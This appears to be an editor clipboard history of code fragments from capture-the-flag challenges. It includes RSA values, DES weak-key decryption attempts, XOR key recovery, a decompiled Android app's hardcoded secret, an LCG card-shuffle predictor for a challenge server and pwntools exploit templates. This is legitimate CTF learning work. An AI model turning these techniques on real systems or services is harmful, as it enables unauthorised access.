	        # print(len(key))
4e86016747e5f1a28c7cc97cc55aead3|file:///home/neo/CTFs/nahamcon2020/homecooked/decrypt.py|27|1|V|python
	for i in range(13, 26, 1):
	    cipher[i] -= 50000
0c3cd79c5bedd169ed24d17acb538a47|file:///home/neo/CTFs/nahamcon2020/homecooked/decrypt.py|28|1|V|python
	    n = int(cipher[i]) - 50000
	    cipher[i] = str(n)
7bdcb564be54007cd027389cd5e23b80|file:///home/neo/CTFs/nahamcon2020/homecooked/decrypt.py|37|1|V|python
	        # print('test: ', num)
3bf0e96530a75c8f28508458cd4254cc|file:///home/neo/CTFs/nahamcon2020/ooolala/prompt.txt|1|1|V|text
	N = 3349683240683303752040100187123245076775802838668125325785318315004398778586538866210198083573169673444543518654385038484177110828274648967185831623610409867689938609495858551308025785883804091
03d765c4f693d9dc5c45d62f9e811981|file:///home/neo/CTFs/nahamcon2020/ooolala/prompt.txt|1|5|v|text
	3349683240683303752040100187123245076775802838668125325785318315004398778586538866210198083573169673444543518654385038484177110828274648967185831623610409867689938609495858551308025785883804091
93c3c3eb7421c02769bdf6f91a7c5e7d|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|14|1|V|python
	        print(test)
	        for c in test:
	            if c not in string.printable:
	                break
1862d5c4fc515f7f3da5ff39c482c9bc|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|15|13|V|python
	            print(test)
f12427e7705d9cebdae4e68266401ee0|file:///home/neo/CTFs/nahamcon2020/ooolala/prompt.txt|3|1|V|text
	c = 87760575554266991015431110922576261532159376718765701749513766666239189012106797683148334771446801021047078003121816710825033894805743112580942399985961509685534309879621205633997976721084983
3a3dac849329d30c353db7711818e4b0|file:///home/neo/CTFs/nahamcon2020/vase/prompt.txt|1|1|V|text
	zmxhz3tkb2vzx3roaxnfzxzlbl9jb3vudf9hc19jcnlwdg9vb30=
7a77d07d54a50ef1afdd6103b78fce55|file:///home/neo/CTFs/nahamcon2020/december/source.py|1|1|V|python
	#!/usr/bin/env python
	
	from Crypto.Cipher import DES
3d0a8bb04868db79c5475bf9bad72363|file:///home/neo/CTFs/nahamcon2020/december/source.py|14|1|V|python
	iv = "13371337"
	des = DES.new(key, DES.MODE_OFB, iv)
ad1d4728efeba5f5817dfdbb8e7707ac|file:///home/neo/CTFs/nahamcon2020/raspberry/prompt.txt|1|5|v|text
	7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317
4d94b3f6d3fe45298dcbdd688bbc6c0b|file:///home/neo/CTFs/nahamcon2020/raspberry/prompt.txt|1|1|V|text
	n = 7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317
	e = 65537
	c = 5300731709583714451062905238531972160518525080858095184581839366680022995297863013911612079520115435945472004626222058696229239285358638047675780769773922795279074074633888720787195549544835291528116093909456225670152733191556650639553906195856979794273349598903501654956482056938935258794217285615471681
33836663c2e39c3d955be055ac3149d4|file:///home/neo/CTFs/nahamcon2020/december/decrypt.py|1|1|V|python
	#!/usr/bin/env pythonV
	
	from Crypto.Cipher import DES
	
	f = open('ciphertext', 'rb')
	ct = f.read()
	
	iv = "13371337"
	des = DES.new(key, DES.MODE_OFB, iv)
	pt = des.decrypt(ct)
	print(pt)
0dd41f0495a201ecd9b1ce40eca4a2db|file:///home/neo/CTFs/nahamcon2020/december/decrypt.py|6|7|v|python
	13245678
36236cef27ed2950ffeb1db7e117d74c|file:///home/neo/CTFs/nahamcon2020/december/decrypt.py|7|1|V|python
	KEY='\x00\x00\x00\x00\x00\x00\x00\x00'.encode('utf-8')
4dfdc0156300600655c01a6af3511840|file:///home/neo/CTFs/nahamcon2020/december/decrypt.py|7|1|V|python
	KEY = b'\x00\x00\x00\x00\x00\x00\x00\x00'
	a = DES.new(KEY, DES.MODE_OFB, IV)
	plaintext = a.decrypt(ciphertext)
	print(plaintext)
	
	KEY = b'\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F'
	a = DES.new(KEY, DES.MODE_OFB, IV)
	plaintext = a.decrypt(ciphertext)
	print(plaintext)
	
	KEY= b"\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0"
	a = DES.new(KEY, DES.MODE_OFB, IV)
	plaintext = a.decrypt(ciphertext)
	print(plaintext)
	
	KEY= b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"
	a = DES.new(KEY, DES.MODE_OFB, IV)
	plaintext = a.decrypt(ciphertext)
	print(plaintext)
	
07b6047a303159002af2798b83d6eb6a|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|2|1|V|python
	
	def xor_bytes(ba1: bytes, ba2: bytes) -> bytes:
	    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
a04fedce6cf410a417c4ef1df3cf6d00|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|9|1|v|python
	with open('encrypted', 'r') as f:
9a8d3bfec21902aa66fcbd8652f85f35|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|9|1|V|python
	with open('encrypted', 'r') as f:
	    msg = ''.join(f.readlines())
	
94f5c303e4d4220d9e5634680324b9c8|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|12|15|V|python
	for i in range(len(msg)):
	    candidate = xor(msg[i:i+len(part_of_msg)], part_of_msg)
	    if candidate.isalnum():
	        print(candidate)
af484afe128ec953e66a8ba1ecd8eba6|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|20|13|v|python
	print(candidate)
adac36a74d68f39c491881e416a90703|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|16|5|v|python
	cands
1d5dbacbab858e82ff7ed56bd3e63974|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|25|12|V|python
	        try:
	            test = xor_bytes(key, k[:4]).decode()
	        except:
	            pass
da9cd1cf7a8e87e9b5a5e1ec249fea6f|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|22|9|V|python
	        print(len(candidate))
c5512a489c3724e7adc7a863da43ca77|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|22|1|V|python
	        if len(candidate) == 5 and candidate.encode().isascii() and candidate[0] == candidate[4]:
59f09600a98607210b943d565acb10ac|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|23|12|^v|python
	len(candidate) == 5 and c
af0e0f88cf093aaeb77e34d2e8067380|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|23|41|v|python
	and candidate[0] == candidate[4]:
9c524800571a6eb61192eb2de8470003|file:///home/neo/vimwiki/DES.wiki|4|1|V|vimwiki
	a = DES.new(KEY, DES.MODE_OFB, IV)
	plaintext = a.decrypt(ciphertext)
	print(plaintext)
	
d704bfbe1eeffede668c9f176487cf5b|file:///home/neo/vimwiki/DES.wiki|5|1|V|vimwiki
	a = DES.new(KEY, DES.MODE_OFB, IV)
	plaintext = a.decrypt(ciphertext)
	print(plaintext)
61f2529360aec54f5dc9804b842cf3fa|file:///home/neo/CTFs/nahamcon2020/twinning/sol_lohi.py|7|13|v|python
	socket
124cfe7b4c17cd1f3e84f0f9bce79c39|file:///home/neo/CTFs/nahamcon2020/twinning/sol_lohi.py|7|13|v|python
	.cryptohack.org
dfc999238cf21811c569dc5248eb344c|file:///home/neo/CTFs/nahamcon2020/twinning/sol_lohi.py|9|1|V|python
	def json_recv(): line = r.recvline()
	    return json.loads(line.decode())
	
	def json_send(hsh):
	    request = json.dumps(hsh).encode()
	    r.sendline(request)
	
	def get_mul_inc(x0, x1, x2, mod):
	    mul = (x2-x1) * mod_inverse((x1-x0),mod) % mod
	    inc = (x1 - mul * x0) % mod
	    return mul, inc
	
	def rebase(n, b=52):
	    if n < b:
	        return [n]
	    else:
	        return [n % b] + rebase(n//b, b)
	
	@total_ordering
	class Card:
	    def __init__(self, value, suit):
	        self.value = value
	        self.suit = suit
	
	    def __str__(self):
	        return f"{self.value} of {self.suit}"
	
	    def __eq__(self, other):
	        return self.value == other.value
	
	    def __gt__(self, other):
	        return VALUES.index(self.value) > VALUES.index(other.value)
	
	class CustomCard:
	    def __init__(self, value, suit):
	        self.value = value
	        self.suit = suit
	
	    def __str__(self):
	        return f"{self.value} of {self.suit}"
	
	    def __eq__(self, other):
	        return self.value == other.value and self.suit == other.suit
	
	    def __gt__(self, other):
	        return VALUES.index(self.value) > VALUES.index(other.value)
	
	VALUES = ['Ace', 'Two', 'Three', 'Four', 'Five', 'Six',
	          'Seven', 'Eight', 'Nine', 'Ten', 'Jack', 'Queen', 'King']
	SUITS = ['Clubs', 'Hearts', 'Diamonds', 'Spades']
	custom_deck = [CustomCard(value, suit) for suit in SUITS for value in VALUES]
	real_deck = [Card(value, suit) for suit in SUITS for value in VALUES]
	
	mod = 2**61 - 1  # 9th mersenne prime
	# print(mod)
	
	rec = json_recv()
	round_num = rec['round']
	hand = rec['hand'].split(' ')
	value = hand[0]
	suit = hand[2]
	card = custom_deck.index(CustomCard(value, suit))
	msg = rec['msg']
	# print(msg)
	msg = msg.split()
	next_shuffle = int(msg[msg.index('after')+1]) - 1
	# print(f"{card} * (52 ** {next_shuffle})")
	rand_num = card * (52 ** next_shuffle)
	total_rounds = 0
	card_arr = []
	random_nums = []
	current_deal = []
	while next_shuffle > 0:
	    next_shuffle -= 1
	    json_send({"choice":"h"})
	    total_rounds += 1
	    rec = json_recv()
	    hand = rec['hand']
	    # print(hand)
	    hand = hand.split()
	    msg = rec['msg']
	    # print(msg)
	    msg = msg.split()
	    value = hand[0]
	    suit = hand[2]
	    current_card = Card(value, suit)
	    current_deal.insert(0, custom_deck.index(current_card))
	    card = custom_deck.index(CustomCard(value, suit))
	    # print(card)
	    card_arr.insert(0,card)
	    # print(f"{card} * (52 ** {next_shuffle})")
	    rand_num += card * (52 ** next_shuffle)
	    if 'reshuffle' in msg:
	        # print(current_deal)
	        # print('--------------\n')
	        # current_deal = reversed(current_deal)
	        # for card in current_deal:
	        #     print(custom_deck[card])
	        current_deal = []
	        random_nums.append(rand_num)
	        # print('Random num:', rand_num)
	        # print(rand_num)
	        if len(random_nums) == 3:
	            mul, inc = get_mul_inc(random_nums[0], random_nums[1], random_nums[2], mod) 
	            print('Mul: ', mul)
	            print('Inc: ', inc)
	            next_rand_num = (random_nums[2] * mul + inc) % mod
	            # print('Next random num:', next_rand_num)
	            next_deal = rebase(next_rand_num)
	            # print(next_deal)
	            while total_rounds <= 100:
	                hidden = next_deal.pop()
	                hidden_card = real_deck[hidden]
	                # print('Current card:', current_card)
	                # print('Guessed hidden card:', hidden_card, hidden)
	                if next_deal == []:
	                    next_rand_num = (next_rand_num * mul + inc) % mod
	                    next_deal = rebase(next_rand_num)
	                if hidden_card < current_card:      
	                    json_send({"choice":"l"})
	                else:
	                    json_send({"choice":"h"})
	                rec = json_recv()
	                if total_rounds == 99 or total_rounds == 98:
	                    print(rec)
	                real_hidden_card = rec['hand'].split(' ')
	                real_hidden_card = Card(real_hidden_card[0], real_hidden_card[2])
	                # print('Real hidden card:', real_hidden_card, real_deck.index(real_hidden_card))
	                current_card = hidden_card
	                total_rounds += 1
	
	            # print('Next random num: ', next_rand_num)
	        next_shuffle = int(msg[msg.index('after')+1])
	        rand_num = 0 
	        card_arr = []
0791c648fe515275feea45bc89104a1f|file:///home/neo/CTFs/nahamcon2020/twinning/sol_lohi.py|9|1|V|python
	print(nums)
7533a9ae348b818bb9790980f9edb2c4|file:///home/neo/CTFs/scripts/pwn/skeleton.py|40|1|V|python
	if args.PWNDBG:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
	    ''')
10ce548c0f94f5cabdf1ef0934229d5d|file:///home/neo/CTFs/scripts/pwn/skeleton.py|45|9|v|python
	PWNDBG
7eb93f5fa4a6395a01e97f0182300afd|file:///home/neo/CTFs/scripts/pwn/skeleton.py|46|34|v|python
	, '-ex', 'init-pwndbg'
810eab3775436963aaf8cba9980e482d|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|34|25|V|python
	        if b'the ' in pt:
	            print(pt)
beffecea94890501ac8bd715fc9c145e|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|33|1|V|python
	        pt = xor_bytes(key, msg).decode()
	
c29790fb5049adbca1adfa910173fe8b|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|23|30|v|python
	.isascii(): 
d104cbb2f29c6ca9b0fb8e2f0d80acd8|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|23|9|V|python
	        if candidate in string.printable:
478db27295ab6c78d586fc06f5e00b34|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|33|9|V|python
	        print(l)
1a1dc91c907325c69271ddf0c944bc72|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|25|21|v|python
	pass
7044383e77d89ee8f278aa8090f86498|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|22|9|V|python
	        if len(candidate) == 5 and candidate[0] == candidate[4]:
a652f4a0a5a17d7ab44086c0ca03a446|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|22|9|V|python
	        if len(candidate) == 5:
12f871a9a72608c5188291eabce3053f|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|23|1|V|python
	        for c in candidate:
	            if c not in string.printable:
	                found = False
	        if found:
	            keys.append(candidate[:-1]) 
f2478e51f006e2dbf615e2b631e180b1|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|22|1|V|python
	        found = True
d9f0d946a2e930aa795c02dedbc9e343|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|22|9|V|python
	        print(candidate)
516aa8c403827ebd7324862d9d24e936|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|22|46|v|python
	isascii
c5849a2b5d4f79d50cbf167b422b4a1b|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|34|9|V|python
	        if b'flag' in pt:
dd559d5324ac9e1f860d3231f9546400|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|30|9|V|python
	        # key = b''.join(key)
d34819c5a49f4f57253b7069a08c7f0b|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|25|1|V|python
	    # for key in keys:
	    #     print(key)
	    # keys = itertools.product(string.printable, repeat=4)
	    # print(len(data))
5c2b803cad4af4c98fab3c0fcbc93133|file:///home/neo/cryptopals/set1/set1_sol.py|211|1|V|python
	    enc_file = open('set1/6.txt', 'r')
1d1bed361c631fd413b8e5d154cb1345|file:///home/neo/cryptopals/set1/set1_sol.py|213|5|V|python
	    enc_text = enc_file.read()
dc730b8506b82ffbbff1c87d0639a6fc|file:///home/neo/cryptopals/set1/set1_sol.py|149|9|V|python
	        block_bytes = bytes(block_str, 'utf-8')
9fada1dbb538dfe209a4b7897cc850e3|file:///home/neo/cryptopals/set1/set1_sol.py|150|9|V|python
	        print(block_bytes)
b2de7424d3785f4fef241118e82c5e20|file:///home/neo/cryptopals/set1/set1_sol.py|214|4|V|python
	    enc_file = open('set1/homework', 'rb')
	    enc_bytes = enc_file.read()
ff7e6467170f1e0b394744cab93427de|file:///home/neo/CTFs/scripts/pwn/pwn_template.py|40|1|V|python
	sl = lambda x : io.sendline(x)
	sla = lambda x, y : io.sendlineafter(x, y)
	se = lambda x : io.send(x)
	sa = lambda x, y : io.sendafter(x, y)
	ru = lambda x : io.recvuntil(x)
	rl = lambda : io.recvline()
	cl = lambda : io.clean()
68023895819a138aaaa5fa0a1cf9543f|file:///home/neo/CTFs/scripts/pwn/pwn_template.py|40|1|V|python
	sl = lambda x : io.sendline(x)
	sla = lambda x, y : io.sendlineafter(x, y)
	se = lambda x : io.send(x)
	sa = lambda x, y : io.sendafter(x, y)
	ru = lambda x : io.recvuntil(x)
	rl = lambda : io.recvline()
	cl = lambda : io.clean()
	uu64 = lambda x : u64(x.ljust(8, b'\x00'))
	
	
0c425c167531ef57eedfeb129e296cb5|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|3|1|V|python
	The docx is a zip file containing an XML of the document. You can open the zip, read the document and parse data using ElementTree.
	
359ec30f393056c1c2ae09cb865db421|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|3|1|V|python
	The advantage of this technique is that you don't need any extra python libraries installed.
6b5f07d4ffcc1f4b0d40f8ad7900141f|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|12|23|v|python
	<pathto docx file>
1658f7f069a5f7461736e847f22a8ce9|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|12|23|v|python
	homework
e5721713494411a8969e3a5a6b996282|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|2|1|V|python
	import zipfile
	import xml.etree.ElementTree
	
	WORD_NAMESPACE = '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}'
	PARA = WORD_NAMESPACE + 'p'
	TEXT = WORD_NAMESPACE + 't'
	TABLE = WORD_NAMESPACE + 'tbl'
	ROW = WORD_NAMESPACE + 'tr'
	CELL = WORD_NAMESPACE + 'tc'
	
	with zipfile.ZipFile('ct.doc') as docx:
	    tree = xml.etree.ElementTree.XML(docx.read('word/document.xml'))
	
	for table in tree.iter(TABLE):
	    for row in table.iter(ROW):
	        for cell in row.iter(CELL):
	            print(''.join(node.text for node in cell.iter(TEXT)))
47269a33f2ccb2bee293ff6b5067e9da|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|22|9|V|python
	        if len(candidate) == 4 and candidate.isalnum():
0b0cc3dc97e13dfefeb5213d93953bf1|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|22|11|^v|python
	 len(candidate) == 4 and 
64394c4f77831c523e7a5ce9f5ff82f1|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|13|17|v|python
	\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1
c42fa69e014ab0e465a61c2155340551|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|16|1|V|python
	    f = open('homework','rb')
bdde29e3c0fe7b687d69a696bbaf71ac|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|13|17|v|python
	WORD
5e44693226ea51ef4ed964091a7e7494|file:///home/neo/CTFs/nahamcon2020/snowflake/frostythesnowman.txt|1|1|V|text
	Frosty the snowman was a jolly happy soul	      	      	     	   
	With a corncob pipe and a button nose     	       	       		   
	And two eyes made out of coal       	      	  		      	    
	Frosty the snowman is a fairy tale, they say  	      	  	       
	He was made of snow but the children know	   	  	       	  
	How he came to life one day	 		 	   		    
	There must have been some magic in	   	     	   	     	  
	That old silk hat they found		    	       		       	  
	For when they placed it on his head  	  	  		  	       
	He began to dance around   	  	 	 	      	       	    
	Oh, Frosty the snowman   	     	  	  	   	  	    
	Was alive as he could be 
	And the children say he could laugh and play
	Just the same as you and me
a71954b5ca89c7c07fa9a8e217e7b091|file:///home/neo/CTFs/nahamcon2020/snowflake/solve.sh|1|1|v|sh
	wordlist
1443b4818ab2777f788873cfc2413ac3|file:///home/neo/CTFs/nahamcon2020/snowflake/solve.sh|4|5|v|sh
	echo "$line"
e08b7bc6ecc61a276430fe57e1dceb44|file:///home/neo/CTFs/nahamcon2020/snowflake/solve.sh|8|5|V|sh
	    echo "$pt"
27cd7d7e1208f81713fc9e212b10597c|file:///home/neo/CTFs/nahamcon2020/snowflake/solve.sh|6|12|v|sh
	"It's there!"
23c983e0f0c1355c02b35d8183c115dc|file:///home/neo/CTFs/nahamcon2020/snowflake/solve.sh|5|24|v|sh
	My long
fdca25d6b3d3566511bdc8835ff3f200|file:///home/neo/CTFs/nahamcon2020/secure_safe/a.java|35|30|v|java
	5up3r_53cur3_53cr37
7aff4b487ece13a9fb96d7d96e3d20f9|file:///home/neo/CTFs/nahamcon2020/secure_safe/a.java|7|1|V|java
	import java.math.BigInteger;
	import java.security.MessageDigest;
af9cbc6ac31c6256724ded704be849d4|file:///home/neo/CTFs/nahamcon2020/secure_safe/a.java|33|1|V|java
	        try {
	            MessageDigest instance = MessageDigest.getInstance("SHA-1");
	            instance.update("5up3r_53cur3_53cr37".getBytes(str));
	            instance.update(str3.getBytes(str));
	            return new String(a(Base64.decode(str2, 0), new BigInteger(1, instance.digest()).toString(16).getBytes()));
	        } catch (UnsupportedEncodingException | NoSuchAlgorithmException e) {
	            e.printStackTrace();
	            return "Error decrypting";
	        }
fb1cddec8a8b4c9ea547357e42d99d3e|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.java|5|1|v|java
	import java.security.MessageDigest;
5949821a50d34f4219d60281008237da|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.java|8|1|V|java
	public static void main (String[] args) {
	    try {
	        MessageDigest instance = MessageDigest.getInstance("SHA-1");
	        instance.update("5up3r_53cur3_53cr37".getBytes(str));
	        instance.update(str3.getBytes(str));
	        return new String(a(Base64.decode(str2, 0), new BigInteger(1, instance.digest()).toString(16).getBytes()));
	    } catch (UnsupportedEncodingException | NoSuchAlgorithmException e) {
	        e.printStackTrace();
	        return "Error decrypting";
	    }
	}
13e73ae337751252294d1e7029a2d3b0|file:///home/neo/CTFs/nahamcon2020/secure_safe/a.java|20|1|V|java
	    public final byte[] a(byte[] bArr, byte[] bArr2) {
	        byte[] bArr3 = new byte[bArr.length];
	        for (int i = 0; i < bArr.length; i++) {
	            bArr3[i] = (byte) (bArr[i] ^ bArr2[i % bArr2.length]);
	        }
	        return bArr3;
	    }
b8911153244772e27e5c20ff00ec1ec6|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.java|20|1|V|java
	            instance.update(str3.getBytes(str));
795c1b3a4aa716c0bb628962b146c9d6|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.java|21|29|v|java
	str3.getBytes(str)
a55cbe833da26edac0e827533f540a94|file:///home/neo/CTFs/nahamcon2020/secure_safe/a.java|6|1|V|java
	import java.io.UnsupportedEncodingException;
9ff637f0765c21aad8deaac2b6d98e51|file:///home/neo/CTFs/nahamcon2020/secure_safe/a.java|9|1|V|java
	import java.security.NoSuchAlgorithmException;
49279b90fdd32ed1b1c0e323ab6c9fa7|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.java|23|1|V|java
	            // instance.update(str3.getBytes(str));
2d211863ec5caccc2082ca410e3896e2|file:///home/neo/CTFs/nahamcon2020/secure_safe/a.java|1|1|V|java
	package b.b.a.a;
	
	import android.os.AsyncTask;
	import android.util.Base64;
	import com.congon4tor.nahamcon2.MainActivity;
	import java.io.UnsupportedEncodingException;
	import java.math.BigInteger;
	import java.security.MessageDigest;
	import java.security.NoSuchAlgorithmException;
	
	public class a extends AsyncTask<String[], Integer, String> {
	
	    /* renamed from: a reason: collision with root package name */
	    public MainActivity f531a;
	
	    public a(MainActivity mainActivity) {
	        this.f531a = mainActivity;
	    }
	
	    public final byte[] a(byte[] bArr, byte[] bArr2) {
	        byte[] bArr3 = new byte[bArr.length];
	        for (int i = 0; i < bArr.length; i++) {
	            bArr3[i] = (byte) (bArr[i] ^ bArr2[i % bArr2.length]);
	        }
	        return bArr3;
	    }
	
	    public Object doInBackground(Object[] objArr) {
	        String[][] strArr = (String[][]) objArr;
	        String str = "UTF-8";
	        String str2 = strArr[0][0];
	        String str3 = strArr[0][1];A
	        try {
	            MessageDigest instance = MessageDigest.getInstance("SHA-1");
	            instance.update("5up3r_53cur3_53cr37".getBytes(str));
	            instance.update(str3.getBytes(str));
	            return new String(a(Base64.decode(str2, 0), new BigInteger(1, instance.digest()).toString(16).getBytes()));
	        } catch (UnsupportedEncodingException | NoSuchAlgorithmException e) {
	            e.printStackTrace();
	            return "Error decrypting";
	        }
	    }
	
	    public void onPostExecute(Object obj) {
	        String str = (String) obj;
	        super.onPostExecute(str);
	        this.f531a.p.setText(str);
	    }
	}
d77f120bdadaf81d13ac8ce8c0df397d|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.java|1|1|V|java
	import java.math.BigInteger;
	import java.security.MessageDigest;
	import java.io.UnsupportedEncodingException;
	import java.security.NoSuchAlgorithmException;
	
	class solve{
	
	    public static final byte[] xor(byte[] bArr, byte[] bArr2) {
	        byte[] bArr3 = new byte[bArr.length];
	        for (int i = 0; i < bArr.length; i++) {
	            bArr3[i] = (byte) (bArr[i] ^ bArr2[i % bArr2.length]);
	        }
	        return bArr3;
	    }
	
	    public static void main (String[] args) {
	        String str = "UTF-8";
	        String output = "d9mdsXd_ s1>ZE6~vX3=gwzs{c7X&";
	        String pin = "1111";
	        try {
	            MessageDigest instance = MessageDigest.getInstance("SHA-1");
	            instance.update("5up3r_53cur3_53cr37".getBytes(str));
	            instance.update(pin.getBytes(str));
	            System.out.println(new String(xor(output.getBytes(str), new BigInteger(1, instance.digest()).toString(16).getBytes())));
	        } catch (UnsupportedEncodingException | NoSuchAlgorithmException e) {
	            e.printStackTrace();
	            System.out.println("Error decrypting");
	        }
	    }
	
	}
	
aa0b5ade2faa5f5d43520a07a01b73e4|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.java|22|9|V|java
	        System.out.println(instance.digest());
3415e94cdd486a2a4bdd006701bd9b8d|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.java|27|24|v|java
	VGhpc19pc19teV9zdXBlcl9mbGFn
42586523b85959133063757a508064a0|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.java|40|9|V|java
	        System.out.println("test");
c81a00c5b4b4b7ea516b27fe89958a85|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.java|43|1|V|java
	        System.out.println(s);
de52304b98049d4f8545e042c12d04b2|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.java|10|1|V|java
	        System.out.println(new String (bArr));
83e5233f59834f2cf6742d4c14402e4a|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.java|11|28|v|java
	new String (bArr)
e78d7574284dc481e36c88646f20af5c|file:///home/neo/CTFs/scripts/pwn/pwn_template.py|28|1|V|python
		    init-gef
		    c
		    '''
		    if args.GDB: return gdb.debug(elf.path, gs)
96f620f7cd4ade71f82e4b451fe0cd3e|file:///home/neo/CTFs/scripts/pwn/pwn_template.py|27|1|V|python
		    gs = '''
		    init-gef
		    c
		    '''
		    if args.GDB: return gdb.debug(elf.path, gs)
e29fa6cdc479b64e9283b3159e6c80ea|file:///home/neo/pwnablexyz/note/exploit.py|43|1|V|python
	        gs = '''
	        init-gef
	        c
	        '''
e2d736bd1c45f89b21cad869f11c4327|file:///home/neo/pwnablexyz/note/exploit.py|50|5|V|python
	    gdb.debug(exe.path, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
8956e1cda345e2a103fd858ff312b3f0|file:///home/neo/pwnablexyz/note/exploit.py|45|5|V|python
	    c
0a1cad2a895ddb3b310bf58d89aefff8|file:///home/neo/pwnablexyz/note/exploit.py|44|5|V|python
	    b edit_note
dd60bc7ca070f127f2d6e9f34abbdf92|file:///home/neo/pwnablexyz/note/exploit.py|33|1|V|python
	if args.GEF:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
	    b edit_note
	    b edit_desc
	    ''')
	    # pie breakpoint function+118
	
	if args.PWNDBG:
	    gs = '''
	    init-pwndbg
	    c
	    '''
	    gdb.debug(exe.path, gs)
daf155423f5e61f4e677af1016ffb866|file:///home/neo/pwnablexyz/note/exploit.py|26|1|V|python
	
	    if args.GEF:
	        gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
	        b edit_note
	        b edit_desc
	        ''')
	        # pie breakpoint function+118
	
3bb1c1ba5d1ff403af69dda12d06c8a3|file:///home/neo/pwnablexyz/note/exploit.py|29|13|V|python
	            c
b2df696edac6c2d0a3dd769739a3b71c|file:///home/neo/CTFs/nahamcon2020/secure_safe/a.java|21|16|v|java
	bArr3
f25c8caa279f1b206fdfd37224ca885a|file:///home/neo/CTFs/nahamcon2020/secure_safe/a.java|3|1|V|java
	import android.os.AsyncTask;
	import android.util.Base64;
	import com.congon4tor.nahamcon2.MainActivity;
	import java.io.UnsupportedEncodingException;
	import java.math.BigInteger;
	import java.security.MessageDigest;
	import java.security.NoSuchAlgorithmException;
0e2abc9c033ca4f2019f426e44001af9|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|2|1|V|java
	import android.os.AsyncTask;
	import android.util.Base64;
1d28d6da09b58076951e92bb024bc05c|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|1|1|V|java
	import com.congon4tor.nahamcon2.MainActivity;
285b1a39fdbcd303c381ee6ec708ced7|file:///home/neo/CTFs/nahamcon2020/secure_safe/a.java|20|1|V|java
	    public final byte[] a(byte[] secret, byte[] hash) {
	        byte[] output = new byte[secret.length];
	        for (int i = 0; i < secret.length; i++) {
	            output[i] = (byte) (secret[i] ^ hash[i % hash.length]);
	        }
	        return output;
	    }
	
	    public Object doInBackground(Object[] objArr) {
	        String[][] strArr = (String[][]) objArr;
	        String str = "UTF-8";
	        String input = strArr[0][0];
	        String flag = strArr[0][1];
	        try {
	            MessageDigest hash = MessageDigest.getInstance("SHA-1");
	            hash.update("5up3r_53cur3_53cr37".getBytes(str));
	            hash.update(flag.getBytes(str));
	            return new String(a(Base64.decode(input, 0), new BigInteger(1, hash.digest()).toString(16).getBytes()));
	        } catch (UnsupportedEncodingException | NoSuchAlgorithmException e) {
	            e.printStackTrace();
	            return "Error decrypting";
	        }
	    }
f5ae09ba848af3cfec67fb7bb7b89a7f|file:///home/neo/CTFs/nahamcon2020/secure_safe/a.java|20|1|V|java
	    public final byte[] a(byte[] secret, byte[] hash) {
	        byte[] output = new byte[secret.length];
	        for (int i = 0; i < secret.length; i++) {
	            output[i] = (byte) (secret[i] ^ hash[i % hash.length]);
	        }
	        return output;
	    }
	
